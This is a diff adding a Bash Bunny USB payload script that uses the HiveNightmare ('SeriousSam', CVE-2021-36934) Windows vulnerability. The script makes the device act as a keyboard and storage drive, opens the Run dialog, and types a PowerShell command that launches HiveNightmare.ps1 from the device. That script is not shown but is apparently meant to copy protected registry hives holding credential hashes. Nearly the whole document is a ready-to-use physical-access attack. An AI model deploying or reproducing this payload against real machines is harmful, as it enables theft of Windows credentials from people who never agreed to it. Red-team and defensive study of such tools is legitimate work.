@@ -1,0 +1,37 @@
+# Title:         HiveNightmare for Bash Bunny
+# Author:        hitem
+# Version:       1.0
+#
+# Leverages the following exploit CVE-2021–36934 dubbed "SeriousSam".
+# PoC-Tool by GossiTheDog: https://github.com/GossiTheDog/HiveNightmare
+# I just made the BashBunny parts :)
+#
+# Purple.............Loading
+# Blue .............Execute
+# Green................Finished
+#
+#!/bin/bash
+
+#-----------------------------------
+# Purple LED - initializing
+LED P
+
+GET SWITCH_POSITION
+DUCKY_LANG se
+
+# Attackmode HID
+ATTACKMODE HID STORAGE
+
+#-----------------------------------
+# Blue LED
+LED B SLOW
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 300
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\HiveNightmare.ps1')"
+QUACK ENTER
+QUACK DELAY 8000
+
+#-----------------------------------
+# Green Lights when finished
+LED G
